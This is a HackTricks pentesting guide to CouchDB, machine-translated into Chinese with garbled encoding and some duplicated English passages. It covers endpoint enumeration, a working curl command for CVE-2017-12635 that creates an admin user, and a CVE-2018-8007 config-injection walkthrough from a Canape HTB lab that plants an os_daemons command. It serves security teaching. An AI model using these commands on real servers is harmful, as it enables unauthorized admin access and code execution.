# 5984,6984 - Pentesting CouchDB

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

- ä½ åœ¨ä¸€ä¸ª**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼

- å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)æ”¶è—å“- [**The PEASS Family**](https://opensea.io/collection/the-peass-family)

- è·å¾—[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)

- **åŠ å…¥** [**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegramç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **é€šè¿‡å‘[hacktricks repo](https://github.com/carlospolop/hacktricks)å’Œ[hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§**ã€‚

</details>

## **åŸºæœ¬ä¿¡æ¯**

CouchDBæ˜¯ä¸€ä¸ªé¢å‘æ–‡æ¡£çš„æ•°æ®åº“ï¼Œæ¯ä¸ªæ–‡æ¡£ä¸­çš„å­—æ®µéƒ½ä»¥é”®å€¼å¯¹çš„å½¢å¼å­˜å‚¨ã€‚å­—æ®µå¯ä»¥æ˜¯ç®€å•çš„é”®/å€¼å¯¹ã€åˆ—è¡¨æˆ–æ˜ å°„ã€‚

å­˜å‚¨åœ¨æ•°æ®åº“ä¸­çš„æ¯ä¸ªæ–‡æ¡£éƒ½è¢«èµ‹äºˆä¸€ä¸ªæ–‡æ¡£çº§åˆ«çš„å”¯ä¸€æ ‡è¯†ç¬¦(`_id`)ï¼Œä»¥åŠå¯¹æ•°æ®åº“è¿›è¡Œçš„æ¯ä¸ªæ›´æ”¹çš„ä¿®è®¢(`_rev`)å·ã€‚

**é»˜è®¤ç«¯å£ï¼š** 5984ï¼ˆhttpï¼‰ï¼Œ6984ï¼ˆhttpsï¼‰
```
PORT      STATE SERVICE REASON
5984/tcp  open  unknown syn-ack
```
## **è‡ªåŠ¨æšä¸¾**

Automatic enumeration is the process of gathering information about a target system or network automatically, without manual intervention. This technique is commonly used in penetration testing to identify potential vulnerabilities and weaknesses.

è‡ªåŠ¨æšä¸¾æ˜¯ä¸€ç§è‡ªåŠ¨æ”¶é›†ç›®æ ‡ç³»ç»Ÿæˆ–ç½‘ç»œä¿¡æ¯çš„è¿‡ç¨‹ï¼Œæ— éœ€æ‰‹åŠ¨å¹²é¢„ã€‚è¿™ç§æŠ€æœ¯é€šå¸¸ç”¨äºæ¸—é€æµ‹è¯•ï¼Œä»¥è¯†åˆ«æ½œåœ¨çš„æ¼æ´å’Œå¼±ç‚¹ã€‚

There are various tools and techniques available for automatic enumeration, including:

è‡ªåŠ¨æšä¸¾æœ‰å¤šç§å·¥å…·å’ŒæŠ€æœ¯å¯ä¾›é€‰æ‹©ï¼ŒåŒ…æ‹¬ï¼š

- **Port scanning**: This involves scanning the target system or network to identify open ports and services running on those ports. Tools like Nmap can be used for this purpose.

- **ç«¯å£æ‰«æ**ï¼šè¿™æ¶‰åŠæ‰«æç›®æ ‡ç³»ç»Ÿæˆ–ç½‘ç»œï¼Œä»¥è¯†åˆ«å¼€æ”¾çš„ç«¯å£å’Œåœ¨è¿™äº›ç«¯å£ä¸Šè¿è¡Œçš„æœåŠ¡ã€‚å¯ä»¥ä½¿ç”¨è¯¸å¦‚Nmapä¹‹ç±»çš„å·¥å…·æ¥å®ç°æ­¤ç›®çš„ã€‚

- **Service fingerprinting**: This technique involves identifying the specific services running on the open ports. Tools like Bannergrab can be used to extract information from service banners.

- **æœåŠ¡æŒ‡çº¹è¯†åˆ«**ï¼šè¿™ç§æŠ€æœ¯æ¶‰åŠè¯†åˆ«åœ¨å¼€æ”¾ç«¯å£ä¸Šè¿è¡Œçš„ç‰¹å®šæœåŠ¡ã€‚å¯ä»¥ä½¿ç”¨Bannergrabç­‰å·¥å…·ä»æœåŠ¡æ¨ªå¹…ä¸­æå–ä¿¡æ¯ã€‚

- **Vulnerability scanning**: This involves scanning the target system or network for known vulnerabilities. Tools like OpenVAS and Nessus can be used for this purpose.

- **æ¼æ´æ‰«æ**ï¼šè¿™æ¶‰åŠæ‰«æç›®æ ‡ç³»ç»Ÿæˆ–ç½‘ç»œä»¥æŸ¥æ‰¾å·²çŸ¥çš„æ¼æ´ã€‚å¯ä»¥ä½¿ç”¨OpenVASå’ŒNessusç­‰å·¥å…·æ¥å®ç°æ­¤ç›®çš„ã€‚

- **Directory and file enumeration**: This technique involves enumerating directories and files on the target system or network. Tools like Dirb and Dirbuster can be used for this purpose.

- **ç›®å½•å’Œæ–‡ä»¶æšä¸¾**ï¼šè¿™ç§æŠ€æœ¯æ¶‰åŠæšä¸¾ç›®æ ‡ç³»ç»Ÿæˆ–ç½‘ç»œä¸Šçš„ç›®å½•å’Œæ–‡ä»¶ã€‚å¯ä»¥ä½¿ç”¨Dirbå’ŒDirbusterç­‰å·¥å…·æ¥å®ç°æ­¤ç›®çš„ã€‚

By automating the enumeration process, penetration testers can save time and effort while efficiently gathering information about the target system or network. This information can then be used to identify potential vulnerabilities and plan further exploitation.

é€šè¿‡è‡ªåŠ¨åŒ–æšä¸¾è¿‡ç¨‹ï¼Œæ¸—é€æµ‹è¯•äººå‘˜å¯ä»¥èŠ‚çœæ—¶é—´å’Œç²¾åŠ›ï¼ŒåŒæ—¶é«˜æ•ˆåœ°æ”¶é›†æœ‰å…³ç›®æ ‡ç³»ç»Ÿæˆ–ç½‘ç»œçš„ä¿¡æ¯ã€‚ç„¶åå¯ä»¥åˆ©ç”¨è¿™äº›ä¿¡æ¯æ¥è¯†åˆ«æ½œåœ¨çš„æ¼æ´å¹¶è®¡åˆ’è¿›ä¸€æ­¥çš„åˆ©ç”¨ã€‚
```bash
nmap -sV --script couchdb-databases,couchdb-stats -p <PORT> <IP>
msf> use auxiliary/scanner/couchdb/couchdb_enum
```
### æ¨ªå¹…

åœ¨è¿›è¡ŒCouchDBæ¸—é€æµ‹è¯•æ—¶ï¼Œé¦–å…ˆè¦è¿›è¡Œçš„æ˜¯æ‰‹åŠ¨æšä¸¾ã€‚æˆ‘ä»¬å¯ä»¥é€šè¿‡æŸ¥çœ‹CouchDBçš„æ¨ªå¹…ä¿¡æ¯æ¥è·å–æœ‰å…³ç›®æ ‡ç³»ç»Ÿçš„ä¸€äº›åŸºæœ¬ä¿¡æ¯ã€‚

ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ¥è·å–CouchDBçš„æ¨ªå¹…ä¿¡æ¯ï¼š

```
curl -X GET http://<target>:5984/
```

å¦‚æœæˆåŠŸè¿æ¥åˆ°CouchDBæœåŠ¡å™¨ï¼Œæ‚¨å°†æ”¶åˆ°ä¸€ä¸ªåŒ…å«æœ‰å…³CouchDBç‰ˆæœ¬å’Œå…¶ä»–ç›¸å…³ä¿¡æ¯çš„å“åº”ã€‚è¿™äº›ä¿¡æ¯å¯¹äºåç»­çš„æ¸—é€æµ‹è¯•éå¸¸æœ‰ç”¨ã€‚
```
curl http://IP:5984/
```
è¿™å°†å‘å·²å®‰è£…çš„CouchDBå®ä¾‹å‘å‡ºGETè¯·æ±‚ã€‚å›å¤åº”è¯¥ç±»ä¼¼äºä»¥ä¸‹ä¹‹ä¸€ï¼š
```bash
{"couchdb":"Welcome","version":"0.10.1"}
{"couchdb":"Welcome","version":"2.0.0","vendor":{"name":"The Apache Software Foundation"}}
```
{% hint style="info" %}
è¯·æ³¨æ„ï¼Œå¦‚æœè®¿é—®couchdbçš„æ ¹ç›®å½•ï¼Œæ‚¨å°†æ”¶åˆ°`401 Unauthorized`çš„é”™è¯¯ï¼Œç±»ä¼¼äº`{"error":"unauthorized","reason":"Authentication required."}`ï¼Œæ‚¨å°†æ— æ³•è®¿é—®æ¨ªå¹…æˆ–ä»»ä½•å…¶ä»–ç«¯ç‚¹ã€‚
{% endhint %}

### ä¿¡æ¯æšä¸¾

ä»¥ä¸‹æ˜¯æ‚¨å¯ä»¥ä½¿ç”¨**GET**è¯·æ±‚è®¿é—®å¹¶æå–ä¸€äº›æœ‰è¶£ä¿¡æ¯çš„ç«¯ç‚¹ã€‚æ‚¨å¯ä»¥åœ¨[couchdbæ–‡æ¡£](https://docs.couchdb.org/en/latest/api/index.html)ä¸­æ‰¾åˆ°æ›´å¤šç«¯ç‚¹å’Œæ›´è¯¦ç»†çš„æè¿°ã€‚

* **`/_active_tasks`** æ­£åœ¨è¿è¡Œçš„ä»»åŠ¡åˆ—è¡¨ï¼ŒåŒ…æ‹¬ä»»åŠ¡ç±»å‹ã€åç§°ã€çŠ¶æ€å’Œè¿›ç¨‹IDã€‚
* **`/_all_dbs`** è¿”å›CouchDBå®ä¾‹ä¸­æ‰€æœ‰æ•°æ®åº“çš„åˆ—è¡¨ã€‚
* **`/_cluster_setup`** è¿”å›èŠ‚ç‚¹æˆ–é›†ç¾¤çš„çŠ¶æ€ï¼Œæ ¹æ®é›†ç¾¤è®¾ç½®å‘å¯¼ã€‚
* **`/_db_updates`** è¿”å›CouchDBå®ä¾‹ä¸­æ‰€æœ‰æ•°æ®åº“äº‹ä»¶çš„åˆ—è¡¨ã€‚ä½¿ç”¨æ­¤ç«¯ç‚¹éœ€è¦`_global_changes`æ•°æ®åº“çš„å­˜åœ¨ã€‚
* **`/_membership`** æ˜¾ç¤ºä½œä¸º`cluster_nodes`çš„é›†ç¾¤ä¸­çš„èŠ‚ç‚¹ã€‚å­—æ®µ`all_nodes`æ˜¾ç¤ºæ­¤èŠ‚ç‚¹çŸ¥é“çš„æ‰€æœ‰èŠ‚ç‚¹ï¼ŒåŒ…æ‹¬å±äºé›†ç¾¤çš„èŠ‚ç‚¹ã€‚
* **`/_scheduler/jobs`** å¤åˆ¶ä½œä¸šåˆ—è¡¨ã€‚æ¯ä¸ªä½œä¸šæè¿°éƒ½åŒ…æ‹¬æºå’Œç›®æ ‡ä¿¡æ¯ã€å¤åˆ¶IDã€æœ€è¿‘äº‹ä»¶çš„å†å²è®°å½•å’Œå…¶ä»–ä¸€äº›ä¿¡æ¯ã€‚
* **`/_scheduler/docs`** å¤åˆ¶æ–‡æ¡£çŠ¶æ€åˆ—è¡¨ã€‚åŒ…æ‹¬æœ‰å…³æ‰€æœ‰æ–‡æ¡£çš„ä¿¡æ¯ï¼Œç”šè‡³åŒ…æ‹¬`completed`å’Œ`failed`çŠ¶æ€ã€‚å¯¹äºæ¯ä¸ªæ–‡æ¡£ï¼Œå®ƒè¿”å›æ–‡æ¡£IDã€æ•°æ®åº“ã€å¤åˆ¶IDã€æºå’Œç›®æ ‡ä»¥åŠå…¶ä»–ä¿¡æ¯ã€‚
* **`/_scheduler/docs/{replicator_db}`**
* **`/_scheduler/docs/{replicator_db}/{docid}`**
* **`/_node/{node-name}`** å¯ä»¥ä½¿ç”¨`/_node/{node-name}`ç«¯ç‚¹æ¥ç¡®è®¤å¤„ç†è¯·æ±‚çš„æœåŠ¡å™¨çš„ErlangèŠ‚ç‚¹åç§°ã€‚å½“è®¿é—®`/_node/_local`ä»¥æ£€ç´¢æ­¤ä¿¡æ¯æ—¶ï¼Œè¿™æ˜¯æœ€æœ‰ç”¨çš„ã€‚
* **`/_node/{node-name}/_stats`** `_stats`èµ„æºè¿”å›ä¸€ä¸ªåŒ…å«è¿è¡ŒæœåŠ¡å™¨ç»Ÿè®¡ä¿¡æ¯çš„JSONå¯¹è±¡ã€‚å­—ç¬¦ä¸²`_local`ç”¨ä½œæœ¬åœ°èŠ‚ç‚¹åç§°çš„åˆ«åï¼Œå› æ­¤å¯¹äºæ‰€æœ‰ç»Ÿè®¡URLï¼Œå¯ä»¥å°†`{node-name}`æ›¿æ¢ä¸º`_local`ï¼Œä»¥ä¸æœ¬åœ°èŠ‚ç‚¹çš„ç»Ÿè®¡ä¿¡æ¯è¿›è¡Œäº¤äº’ã€‚
* **`/_node/{node-name}/_system`** `_system`èµ„æºè¿”å›ä¸€ä¸ªåŒ…å«è¿è¡ŒæœåŠ¡å™¨å„ç§ç³»ç»Ÿçº§ç»Ÿè®¡ä¿¡æ¯çš„JSONå¯¹è±¡ã€‚æ‚¨å¯ä»¥ä½¿ç”¨`_local`ä½œä¸º`{node-name}`æ¥è·å–å½“å‰èŠ‚ç‚¹ä¿¡æ¯ã€‚
* **`/_node/{node-name}/_restart`**
* **`/_up`** ç¡®è®¤æœåŠ¡å™¨æ­£åœ¨è¿è¡Œå¹¶å‡†å¤‡å¥½å“åº”è¯·æ±‚ã€‚å¦‚æœ[`maintenance_mode`](https://docs.couchdb.org/en/latest/config/couchdb.html#couchdb/maintenance\_mode)ä¸º`true`æˆ–`nolb`ï¼Œè¯¥ç«¯ç‚¹å°†è¿”å›404å“åº”ã€‚
* **`/_uuids`** ä»CouchDBå®ä¾‹è¯·æ±‚ä¸€ä¸ªæˆ–å¤šä¸ªé€šç”¨å”¯ä¸€æ ‡è¯†ç¬¦ï¼ˆUUIDï¼‰ã€‚
* **`/_reshard`** è¿”å›å·²å®Œæˆã€å¤±è´¥ã€è¿è¡Œã€åœæ­¢å’Œæ€»ä½œä¸šçš„è®¡æ•°ï¼Œä»¥åŠé›†ç¾¤ä¸Šçš„reshardingçŠ¶æ€ã€‚

å¯ä»¥æ ¹æ®æ­¤å¤„çš„è¯´æ˜æå–æ›´å¤šæœ‰è¶£çš„ä¿¡æ¯ï¼š[https://lzone.de/cheat-sheet/CouchDB](https://lzone.de/cheat-sheet/CouchDB)

### **æ•°æ®åº“åˆ—è¡¨**
```
curl -X GET http://IP:5984/_all_dbs
```
å¦‚æœè¯¥è¯·æ±‚**è¿”å›401æœªç»æˆæƒ**ï¼Œé‚£ä¹ˆæ‚¨éœ€è¦ä¸€äº›**æœ‰æ•ˆçš„å‡­æ®**æ¥è®¿é—®æ•°æ®åº“ï¼š
```
curl -X GET http://user:password@IP:5984/_all_dbs
```
ä¸ºäº†æ‰¾åˆ°æœ‰æ•ˆçš„å‡­è¯ï¼Œä½ å¯ä»¥å°è¯•å¯¹æœåŠ¡è¿›è¡Œæš´åŠ›ç ´è§£ã€‚

è¿™æ˜¯ä¸€ä¸ª CouchDB å“åº”çš„ç¤ºä¾‹ï¼Œå½“ä½ æ‹¥æœ‰è¶³å¤Ÿçš„æƒé™æ¥åˆ—å‡ºæ•°æ®åº“æ—¶ï¼ˆå®ƒåªæ˜¯ä¸€ä¸ªæ•°æ®åº“åˆ—è¡¨ï¼‰ï¼š
```bash
["_global_changes","_metadata","_replicator","_users","passwords","simpsons"]
```
### æ•°æ®åº“ä¿¡æ¯

æ‚¨å¯ä»¥é€šè¿‡è®¿é—®æ•°æ®åº“åç§°æ¥è·å–ä¸€äº›æ•°æ®åº“ä¿¡æ¯ï¼ˆä¾‹å¦‚æ–‡ä»¶æ•°é‡å’Œå¤§å°ï¼‰ï¼š
```bash
curl http://IP:5984/<database>
curl http://localhost:5984/simpsons
#Example response:
{"db_name":"simpsons","update_seq":"7-g1AAAAFTeJzLYWBg4MhgTmEQTM4vTc5ISXLIyU9OzMnILy7JAUoxJTIkyf___z8rkQmPoiQFIJlkD1bHjE-dA0hdPFgdAz51CSB19WB1jHjU5bEASYYGIAVUOp8YtQsgavfjtx-i9gBE7X1i1D6AqAX5KwsA2vVvNQ","sizes":{"file":62767,"external":1320,"active":2466},"purge_seq":0,"other":{"data_size":1320},"doc_del_count":0,"doc_count":7,"disk_size":62767,"disk_format_version":6,"data_size":2466,"compact_running":false,"instance_start_time":"0"}
```
### **æ–‡æ¡£åˆ—è¡¨**

åˆ—å‡ºæ•°æ®åº“ä¸­çš„æ¯ä¸ªæ¡ç›®

```plaintext
GET /{database}/_all_docs
```

**Example Response:**

```json
{
  "total_rows": 3,
  "offset": 0,
  "rows": [
    {
      "id": "doc1",
      "key": "doc1",
      "value": {
        "rev": "1-234567890abcdef"
      }
    },
    {
      "id": "doc2",
      "key": "doc2",
      "value": {
        "rev": "1-34567890abcdef"
      }
    },
    {
      "id": "doc3",
      "key": "doc3",
      "value": {
        "rev": "1-4567890abcdef"
      }
    }
  ]
}
```

### **ç¤ºä¾‹å“åº”ï¼š**

```json
{
  "total_rows": 3,
  "offset": 0,
  "rows": [
    {
      "id": "doc1",
      "key": "doc1",
      "value": {
        "rev": "1-234567890abcdef"
      }
    },
    {
      "id": "doc2",
      "key": "doc2",
      "value": {
        "rev": "1-34567890abcdef"
      }
    },
    {
      "id": "doc3",
      "key": "doc3",
      "value": {
        "rev": "1-4567890abcdef"
      }
    }
  ]
}
```
```bash
curl -X GET http://IP:5984/{dbname}/_all_docs
curl http://localhost:5984/simpsons/_all_docs
#Example response:
{"total_rows":7,"offset":0,"rows":[
{"id":"f0042ac3dc4951b51f056467a1000dd9","key":"f0042ac3dc4951b51f056467a1000dd9","value":{"rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329"}},
{"id":"f53679a526a868d44172c83a61000d86","key":"f53679a526a868d44172c83a61000d86","value":{"rev":"1-7b8ec9e1c3e29b2a826e3d14ea122f6e"}},
{"id":"f53679a526a868d44172c83a6100183d","key":"f53679a526a868d44172c83a6100183d","value":{"rev":"1-e522ebc6aca87013a89dd4b37b762bd3"}},
{"id":"f53679a526a868d44172c83a61002980","key":"f53679a526a868d44172c83a61002980","value":{"rev":"1-3bec18e3b8b2c41797ea9d61a01c7cdc"}},
{"id":"f53679a526a868d44172c83a61003068","key":"f53679a526a868d44172c83a61003068","value":{"rev":"1-3d2f7da6bd52442e4598f25cc2e84540"}},
{"id":"f53679a526a868d44172c83a61003a2a","key":"f53679a526a868d44172c83a61003a2a","value":{"rev":"1-4446bfc0826ed3d81c9115e450844fb4"}},
{"id":"f53679a526a868d44172c83a6100451b","key":"f53679a526a868d44172c83a6100451b","value":{"rev":"1-3f6141f3aba11da1d65ff0c13fe6fd39"}}
]}
```
### **è¯»å–æ–‡æ¡£**

è¯»å–æ•°æ®åº“ä¸­æ–‡æ¡£çš„å†…å®¹ï¼š
```bash
curl -X GET http://IP:5984/{dbname}/{id}
curl http://localhost:5984/simpsons/f0042ac3dc4951b51f056467a1000dd9
#Example response:
{"_id":"f0042ac3dc4951b51f056467a1000dd9","_rev":"1-fbdd816a5b0db0f30cf1fc38e1a37329","character":"Homer","quote":"Doh!"}
```
## CouchDBç‰¹æƒæå‡ [CVE-2017-12635](https://cve.mitre.org/cgi-bin/cvename.cgi?name=2017-12635)

ç”±äºErlangå’ŒJavaScript JSONè§£æå™¨ä¹‹é—´çš„å·®å¼‚ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹è¯·æ±‚**åˆ›å»ºä¸€ä¸ªå…·æœ‰å‡­æ®`hacktricks:hacktricks`çš„ç®¡ç†å‘˜ç”¨æˆ·**ï¼š
```bash
curl -X PUT -d '{"type":"user","name":"hacktricks","roles":["_admin"],"roles":[],"password":"hacktricks"}' localhost:5984/_users/org.couchdb.user:hacktricks -H "Content-Type:application/json"
```
[**æœ‰å…³æ­¤æ¼æ´çš„æ›´å¤šä¿¡æ¯è¯·ç‚¹å‡»æ­¤å¤„**](https://justi.cz/security/2017/11/14/couchdb-rce-npm.html).

## CouchDBè¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ˆRCEï¼‰

### Erlang Cookie

åœ¨CouchDBæ–‡æ¡£çš„[é›†ç¾¤è®¾ç½®éƒ¨åˆ†](http://docs.couchdb.org/en/stable/cluster/setup.html#cluster-setup)ä¸­ï¼Œå®ƒè®¨è®ºäº†CouchDBä½¿ç”¨çš„ä¸åŒç«¯å£ï¼š

> CouchDBåœ¨é›†ç¾¤æ¨¡å¼ä¸‹ä½¿ç”¨ç«¯å£`5984`ï¼Œå°±åƒç‹¬ç«‹æ¨¡å¼ä¸€æ ·ï¼Œä½†å®ƒè¿˜ä½¿ç”¨`5986`ç”¨äºèŠ‚ç‚¹æœ¬åœ°APIã€‚
>
> Erlangä½¿ç”¨TCPç«¯å£`4369`ï¼ˆEPMDï¼‰æ¥æŸ¥æ‰¾å…¶ä»–èŠ‚ç‚¹ï¼Œå› æ­¤æ‰€æœ‰æœåŠ¡å™¨å¿…é¡»èƒ½å¤Ÿåœ¨æ­¤ç«¯å£ä¸Šç›¸äº’é€šä¿¡ã€‚åœ¨Erlangé›†ç¾¤ä¸­ï¼Œæ‰€æœ‰èŠ‚ç‚¹éƒ½è¿æ¥åˆ°æ‰€æœ‰å…¶ä»–èŠ‚ç‚¹ã€‚ä¸€ä¸ªç½‘çŠ¶ç»“æ„ã€‚

ç„¶åæœ‰ä¸€ä¸ªæœ‰è¶£çš„è­¦å‘Šï¼š

![1536931232858](https://0xdf.gitlab.io/img/1536931232858.png)

å¦‚æœæˆ‘ä»¬æŸ¥çœ‹è¿›ç¨‹åˆ—è¡¨ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°cookieï¼Œ"monster"ï¼š
```
www-data@canape:/$ ps aux | grep couchdb
root        744  0.0  0.0   4240   640 ?        Ss   Sep13   0:00 runsv couchdb
root        811  0.0  0.0   4384   800 ?        S    Sep13   0:00 svlogd -tt /var/log/couchdb
homer       815  0.4  3.4 649348 34524 ?        Sl   Sep13   5:33 /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/b
```
**æ‚¨å¯ä»¥**[**é˜…è¯»æ­¤éƒ¨åˆ†ä»¥äº†è§£å¦‚ä½•æ»¥ç”¨Erlangçš„cookieä»¥è·å–RCE**](4369-pentesting-erlang-port-mapper-daemon-epmd.md#erlang-cookie-rce)**ã€‚**
æ­¤å¤–ï¼Œæ‚¨å¯ä»¥é˜…è¯»ä¸€äº›**Canape HTBæœºå™¨çš„å†™ä½œ**[**åƒè¿™ä¸ª**](https://0xdf.gitlab.io/2018/09/15/htb-canape.html#couchdb-execution)**ï¼Œä»¥äº†è§£å’Œ**ç»ƒä¹ **å¦‚ä½•**åˆ©ç”¨æ­¤æ¼æ´**ã€‚

### **æˆåŠŸçš„CVE-2018-8007ä¸local.iniå†™å…¥æƒé™**

åœ¨æ’°å†™æœ¬æ–‡æ—¶ï¼Œæˆ‘å‘ç°mdsecå‘å¸ƒäº†CouchDBçš„ä¸€ä¸ªæ–°CVEï¼Œ[CVE-2018-8007](https://www.mdsec.co.uk/2018/08/advisory-cve-2018-8007-apache-couchdb-remote-code-execution/)ã€‚å®ƒè¿˜éœ€è¦å¯¹`local.ini`æ–‡ä»¶è¿›è¡Œå†™å…¥ï¼Œå› æ­¤å¯¹äºCanapeæ¥è¯´å¹¶ä¸æ˜¯ä¸€ä¸ªæœ‰ç”¨çš„é€‰é¡¹ã€‚ä½†æ˜¯æ—¢ç„¶æˆ‘å·²ç»å°†å…¶ä½œä¸ºrootç”¨æˆ·è®¾ç½®ä¸ºå¯å†™ï¼Œè®©æˆ‘ä»¬çœ‹çœ‹æ˜¯å¦å¯ä»¥ä½¿å…¶å·¥ä½œã€‚

ä»ä¸€ä¸ªå¹²å‡€ä¸”ç°åœ¨å¯å†™çš„`local.ini`å¼€å§‹ï¼ˆå¹¶å¤‡ä»½ï¼‰ï¼š
```
root@canape:/home/homer/etc# ls -l
total 40
-r--r--r-- 1 homer homer 18477 Jan 20  2018 default.ini
-rw-rw-rw- 1 homer homer  4841 Sep 14 17:39 local.ini
-r--r--r-- 1 root  root   4841 Sep 14 14:30 local.ini.bk
-r--r--r-- 1 homer homer  1345 Jan 14  2018 vm.args
```
æˆ‘ä»¬å¯ä»¥ä½¿ç”¨curlå‘½ä»¤ä¿®æ”¹`local.ini`æ–‡ä»¶ä¸­çš„æºã€‚è¿™é‡Œçš„æ¼æ´æ˜¯ï¼Œå¦‚æœæˆ‘ä»¬ä½¿ç”¨curlå‘½ä»¤æ”¾ç½®ä¸€ä¸ªæ–°çš„æºï¼Œç„¶ååŠ ä¸Šæ¢è¡Œç¬¦ï¼Œæˆ‘ä»¬å¯ä»¥å†™å…¥å…¶ä»–å†…å®¹ï¼ŒåŒ…æ‹¬ä¸€ä¸ªæ–°çš„å¤´éƒ¨å’Œè¯¦ç»†ä¿¡æ¯ã€‚å› æ­¤ï¼Œæˆ‘ä»¬å°†åˆ©ç”¨`[os_daemons]`å­—æ®µï¼Œå¹¶æ·»åŠ ä¸€ä¸ªCouchDBå°è¯•ä¿æŒè¿è¡Œçš„è¿›ç¨‹ï¼š
```bash
www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/cors/origins' -H "Accept: application/json" -H "Content-Type: application/json" -d "0xdf\n\n[os_daemons]\ntestdaemon = /usr/bin/touch /tmp/0xdf"
```
åœ¨æ ¹shellä¸­ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°æœ‰å“ªäº›æ›´æ”¹ï¼š
```
root@canape:/home/homer/etc# diff local.ini local.ini.bk
119,124d118
<
< [cors]
< origins = 0xdf
<
< [os_daemons]
< test_daemon = /usr/bin/touch /tmp/0xdf
```
ç„¶è€Œï¼Œè¯¥æ–‡ä»¶å¹¶ä¸å­˜åœ¨ï¼š
```
root@canape:/home/homer/etc# ls /tmp/0xdf
ls: cannot access '/tmp/0xdf': No such file or directory
```
å¦‚æœæˆ‘ä»¬æŸ¥çœ‹å¸¦æœ‰â€œcouchdbâ€çš„cmdlineè¿è¡Œçš„è¿›ç¨‹ï¼Œæˆ‘ä»¬ä¸ä»…å¯ä»¥çœ‹åˆ°ä¹‹å‰ä½¿ç”¨çš„cookieå€¼çš„å‘½ä»¤è¡Œï¼Œè¿˜å¯ä»¥çœ‹åˆ°`runsrv couchdb`ï¼š
```
root@canape:/home/homer/bin# ps aux | grep couch
root        711  0.0  0.0   4240   696 ?        Ss   14:28   0:00 runsv couchdb
root        728  0.0  0.0   4384   812 ?        S    14:28   0:00 svlogd -tt /var/log/couchdb
homer      1785  0.8  3.1 638992 31248 ?        Sl   17:55   0:01 /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/bin/.. -progname couchdb -- -home /home/homer -- -boot /home/homer/bi
n/../releases/2.0.0/couchdb -name couchdb@localhost -setcookie monster -kernel error_logger silent -sasl sasl_error_logger false -noshell -noinput -config /home/homer/bin/../releases/2.0.0/sys.config
```
å¦‚æœæˆ‘ä»¬æ€æ‰è¯¥è¿›ç¨‹ï¼Œå®ƒä¼šç«‹å³é‡æ–°å¯åŠ¨ï¼ˆæ³¨æ„æ–°çš„è¿›ç¨‹IDï¼‰ï¼š
```
root@canape:/home/homer/etc# kill 711
root@canape:/home/homer/etc# ps aux | grep runsrv
root       2031  0.0  0.0  14224   980 pts/2    S+   18:09   0:00 grep --color=auto runsrv
```
å¹¶ä¸”ï¼Œåœ¨é‡æ–°å¯åŠ¨æ—¶ï¼Œè¿è¡Œæ“ä½œç³»ç»Ÿå®ˆæŠ¤è¿›ç¨‹ï¼š
```
root@canape:/home/homer/etc# ls /tmp/0xdf
/tmp/0xdf
```
### **é€šè¿‡å…·æœ‰local.iniå†™æƒé™çš„CVE-2017-12636æˆåŠŸå°è¯•**

CVE-2017-12636å…è®¸é€šè¿‡couchdbè¿›ç¨‹æ‰§è¡Œä»£ç ã€‚ç„¶è€Œï¼Œåœ¨è¿™ä¸ªé…ç½®ä¸­å®ƒä¸èµ·ä½œç”¨ã€‚

æœ‰ä¸€äº›å‚è€ƒçš„POCï¼š

* [https://raw.githubusercontent.com/vulhub/vulhub/master/couchdb/CVE-2017-12636/exp.py](https://raw.githubusercontent.com/vulhub/vulhub/master/couchdb/CVE-2017-12636/exp.py)
* [https://www.exploit-db.com/exploits/44913/](https://www.exploit-db.com/exploits/44913/)

